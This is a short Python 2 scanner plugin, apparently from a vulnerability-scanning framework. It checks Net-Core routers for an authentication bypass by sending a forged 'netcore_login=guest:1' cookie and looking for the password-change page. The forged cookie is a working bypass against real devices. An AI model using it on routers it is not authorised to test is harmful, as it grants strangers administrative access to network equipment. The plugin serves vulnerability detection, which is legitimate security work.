# !/usr/bin/dev python
# -*- coding:utf-8 -*-

"""
reference: 
http://www.wooyun.org/bugs/wooyun-2010-0109095
"""
import urlparse
def assign(service, arg):
    if service == 'www':
        arr = urlparse.urlparse(arg)
        return True, '%s://%s/' % (arr.scheme, arr.netloc)

    


def audit(args):
    targetUrl = args + 'index.htm'
    oriCode, head, oriRes, _, _ = curl.curl(targetUrl)
    code, head, res, _, _ = curl.curl2(targetUrl, \
                    header='cookie:netcore_login=guest:1')
    # 这里直接使用200是因为没有授权的情况下会跳转到 login.htm
    # 响应头这个时候就是3xx了
    msg = u'修改登录密码'
    msgs = [msg.encode(x) for x in ('utf-8', 'gbk')]
    if code == 200 and msgs[0] not in oriRes and msgs[1] not in oriRes:
        if msgs[0] in res or msgs[1] in res:
            security_hole('Net-Core router Auth bypass')


if __name__ == "__main__":
    from dummy import *
    audit(assign('www','http://www.example.com/')[1])